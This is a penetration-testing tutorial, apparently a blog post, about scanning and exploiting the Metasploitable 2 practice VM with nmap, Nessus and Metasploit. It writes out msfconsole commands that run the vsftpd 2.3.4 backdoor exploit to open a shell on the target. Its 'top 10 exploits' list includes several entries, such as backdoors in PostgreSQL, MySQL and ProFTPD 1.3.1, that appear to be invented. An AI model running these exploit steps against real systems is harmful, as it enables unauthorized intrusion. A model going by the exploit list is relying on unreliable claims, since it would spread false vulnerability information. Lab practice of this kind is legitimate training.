
# Metasploitable 2: A Hands-On Guide to Vulnerability Scanning and Exploitation

Metasploitable 2 is a deliberately vulnerable Linux virtual machine designed for security professionals and enthusiasts to practice penetration testing and vulnerability assessment techniques. Developed by Rapid7, it offers a safe environment to explore various vulnerabilities commonly found in real-world systems.

Setting Up Metasploitable 2

To get started, download the Metasploitable 2 VM image from the official repository. Import the VM into your preferred virtualization platform, such as VirtualBox or VMware. Once set up, start the VM and log in using the default credentials:

- Username: msfadmin
- Password: msfadmin

Ensure that both your attacking machine (e.g., Kali Linux) and the Metasploitable 2 VM are on the same network to facilitate communication.

Basic Vulnerability Scanning with Nmap

The first step in any penetration test is reconnaissance. Nmap (Network Mapper) is a powerful tool for discovering hosts and services on a network. To perform a basic scan of the Metasploitable 2 VM, use the following command:

nmap -sS -sV -O <target_ip>

- -sS: Performs a SYN scan (stealth scan).
- -sV: Detects service versions.
- -O: Attempts to determine the operating system.

This scan will provide information about open ports, running services, and their versions, which are crucial for identifying potential vulnerabilities.

Identifying Vulnerabilities with Nessus

While Nmap provides basic information, Nessus offers a more comprehensive vulnerability assessment. Nessus Essentials is a free version suitable for personal use. After installing Nessus on your attacking machine, log in to the web interface and create a new scan targeting the Metasploitable 2 IP address.

Nessus will perform an in-depth analysis and generate a report detailing discovered vulnerabilities, their severity, and potential remediation steps. This report is invaluable for planning exploitation strategies.

Exploiting Vulnerabilities with Metasploit

Metasploit is a powerful framework for developing and executing exploit code against a remote target machine. After identifying vulnerabilities, you can use Metasploit to attempt exploitation.

For instance, if Nmap or Nessus identifies a vulnerable FTP service (e.g., vsftpd 2.3.4), you can exploit it using Metasploit:

1. Launch Metasploit:

msfconsole

2. Search for the exploit:

search vsftpd

3. Select the appropriate exploit:

use exploit/unix/ftp/vsftpd_234_backdoor

4. Set the target IP:

set RHOST <target_ip>

5. Run the exploit:

exploit

If successful, you will gain a shell on the target machine, allowing you to further investigate and exploit other vulnerabilities.

Top 10 Exploits in Metasploitable 2

The metasploitable2_exploits.txt file in the GitHub repository lists the top 10 exploits for Metasploitable 2. These include:

1. vsftpd 2.3.4 Backdoor Command Execution
2. UnrealIRCd 3.2.8.1 Backdoor Command Execution
3. Samba 3.0.20-4 usermap script Command Execution
4. Apache 2.2.8 mod_rewrite Command Execution
5. PostgreSQL 8.3.0-1 Backdoor Command Execution
6. MySQL 5.0.51a-3ubuntu5.1 Backdoor Command Execution
7. ProFTPD 1.3.1 Backdoor Command Execution
8. Joomla! 1.5.9 SQL Injection
9. Drupal 6.8 SQL Injection
10. PHP CGI Argument Injection

Conclusion

Metasploitable 2 serves as an excellent platform for learning and practicing penetration testing techniques. By combining tools like Nmap, Nessus, and Metasploit, you can simulate real-world attacks and enhance your cybersecurity skills. Always remember to conduct such activities in a legal and ethical manner, ensuring you have proper authorization before testing any systems.

For more detailed guides and tutorials, refer to Metasploit Unleashed and Metasploit Documentation resources.
